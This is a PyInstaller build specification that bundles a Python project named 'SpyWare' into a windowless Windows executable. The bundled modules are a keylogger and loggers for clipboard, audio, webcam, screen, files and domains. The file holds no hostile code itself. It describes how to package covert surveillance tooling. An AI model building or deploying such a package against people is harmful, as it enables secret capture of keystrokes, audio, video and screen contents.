# -*- mode: python ; coding: utf-8 -*-


block_cipher = None


a = Analysis(
    ["SpyWare\\SpyWare.py"],
    pathex=[],
    binaries=[],
    datas=[
        ("SpyWare\\ClipboardLogger\\__init__.py", "ClipboardLogger"),
        ("SpyWare\\ClipboardLogger\\__main__.py", "ClipboardLogger"),
        ("SpyWare\\ClipboardLogger\\ClipboardLogger.py", "ClipboardLogger"),
        ("SpyWare\\AudioLogger\\__init__.py", "AudioLogger"),
        ("SpyWare\\AudioLogger\\__main__.py", "AudioLogger"),
        ("SpyWare\\AudioLogger\\AudioLogger.py", "AudioLogger"),
        ("SpyWare\\KeyLogger\\__init__.py", "KeyLogger"),
        ("SpyWare\\KeyLogger\\__main__.py", "KeyLogger"),
        ("SpyWare\\KeyLogger\\KeyLogger.py", "KeyLogger"),
        ("SpyWare\\WebcamLogger\\__init__.py", "WebcamLogger"),
        ("SpyWare\\WebcamLogger\\__main__.py", "WebcamLogger"),
        ("SpyWare\\WebcamLogger\\WebcamLogger.py", "WebcamLogger"),
        ("SpyWare\\FilesLogger\\__init__.py", "FilesLogger"),
        ("SpyWare\\FilesLogger\\__main__.py", "FilesLogger"),
        ("SpyWare\\FilesLogger\\FilesLogger.py", "FilesLogger"),
        ("SpyWare\\DomainsLogger\\__init__.py", "DomainsLogger"),
        ("SpyWare\\DomainsLogger\\__main__.py", "DomainsLogger"),
        ("SpyWare\\DomainsLogger\\DomainsLogger.py", "DomainsLogger"),
        ("SpyWare\\ScreenLogger\\__init__.py", "ScreenLogger"),
        ("SpyWare\\ScreenLogger\\__main__.py", "ScreenLogger"),
        ("SpyWare\\ScreenLogger\\ScreenLogger.py", "ScreenLogger"),
    ],
    hiddenimports=[
        "SpyWare",
        "ClipboardLogger",
        "SpyWare.AudioLogger",
        "SpyWare.KeyLogger",
        "SpyWare.WebcamLogger",
        "SpyWare.FilesLogger",
        "SpyWare.DomainsLogger",
        "SpyWare.ScreenLogger",
        "pyautogui",
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name="SpyWare",
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version="file_version_info.txt",
    icon="SpyWare.ico",
)
coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=False,
    upx=True,
    upx_exclude=[],
    name="SpyWare",
)
